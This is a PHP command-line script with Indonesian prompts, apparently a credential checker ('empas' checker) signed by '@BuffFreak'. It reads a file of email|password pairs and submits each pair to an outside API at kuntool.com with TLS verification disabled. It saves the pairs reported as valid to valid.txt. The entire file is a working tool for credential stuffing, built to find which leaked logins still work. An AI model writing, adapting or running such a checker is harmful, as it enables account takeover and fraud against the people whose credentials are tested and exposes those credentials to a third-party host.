<?php
echo "================== POWERED BY @BuffFreak ==================\n";
echo "Masukkan List Empas yang berdelimiter \"|\" : ";
$empas = trim(fgets(STDIN));
$explodeEmpas = explode("\n", file_get_contents($empas));
foreach($explodeEmpas as $data){
    $explodeLagi = explode("|", $data);
    $chArray = [
        CURLOPT_URL => "https://kuntool.com/api/index.php?email=".$explodeLagi[0]."&password=".$explodeLagi[1],
        CURLOPT_USERAGENT => "Mozilla/5.0 (Linux; Android 5.1.1; ASUS_X014D Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
    ];
    $ch = curl_init();
    curl_setopt_array($ch, $chArray);
    $result = curl_exec($ch);
    list($header, $body) = explode("\r\n\r\n", $result);
    $decodeBody = json_decode($body, true);
    if($decodeBody['status'] === "OK"){
        echo $explodeLagi[0]." => ".$decodeBody['msg']."\n";
        $fileOpen = fopen("valid.txt", "a");
        fwrite($fileOpen, $explodeLagi[0]."|".$explodeLagi[1].PHP_EOL);
        fclose($fileOpen);
    }else{
        echo $explodeLagi[0]." => ".$decodeBody['msg']."\n"; 
    }
}
?>